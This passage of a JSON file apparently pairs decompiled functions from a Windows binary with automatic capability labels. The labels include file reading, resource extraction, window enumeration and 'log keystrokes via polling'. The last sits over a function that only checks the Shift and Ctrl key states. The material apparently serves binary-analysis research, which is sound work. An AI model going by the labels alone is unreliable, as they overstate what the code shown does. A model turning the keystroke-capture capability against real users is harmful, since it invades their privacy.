        "decompiled_code": "\nint32_t fcn.00405d78(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    if (*0x463660 == '\\0') {\n        return *(*(in_FS_OFFSET + 0x2c) + *0x46109c * 4);\n    }\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x46109c);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    fcn.00405d34();\n    iVar1 = sub.kernel32.dll_TlsGetValue(*0x46109c);\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return *0x46366c;\n}\n",
        "token_count": 158
    },
    "0040831c": {
        "rules": [
            "read file on Windows"
        ],
        "decompiled_code": "\nulong fcn.0040831c(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uStack36;\n    \n    iVar1 = sub.kernel32.dll_ReadFile();\n    uStack36 = in_EAX;\n    if (iVar1 == 0) {\n        uStack36 = 0xffffffff;\n    }\n    return CONCAT44(uStack36, uStack36);\n}\n",
        "token_count": 86
    },
    "00416114": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416114(uint lpType)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint lpName;\n    \n    iVar1 = sub.kernel32.dll_FindResourceA();\n    *(in_EAX + 0x10) = iVar1;\n    if (iVar1 == 0) {\n        fcn.004160a4(&stack0xfffffffc);\n    }\n    iVar1 = sub.kernel32.dll_LoadResource();\n    *(in_EAX + 0x14) = iVar1;\n    if (iVar1 == 0) {\n        fcn.004160a4(&stack0xfffffffc);\n    }\n    uVar2 = sub.kernel32.dll_SizeofResource();\n    sub.kernel32.dll_LockResource(*(in_EAX + 0x14), uVar2);\n    fcn.00415e3c();\n    return;\n}\n",
        "token_count": 196
    },
    "00433ce8": {
        "rules": [
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.00433ce8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc) = 0;\n    *(in_EAX + 0xd) = 0;\n    *(in_EAX + 4) = 0;\n    sub.user32.dll_EnumWindows(fcn.00433c34);\n    return;\n}\n",
        "token_count": 82
    },
    "004505c8": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nuint32_t fcn.004505c8(void)\n\n{\n    int16_t iVar1;\n    uint32_t in_EAX;\n    uint32_t unaff_EBX;\n    uint32_t uVar2;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *0x450600;\n    iVar1 = sub.user32.dll_GetKeyState(0x10);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 1;\n    }\n    iVar1 = sub.user32.dll_GetKeyState(0x11);\n    if (iVar1 < 0) {\n        uVar2 = uVar2 | 4;\n    }\n    if ((in_EAX & 0x20000000) != 0) {\n        uVar2 = uVar2 | 2;\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    }
}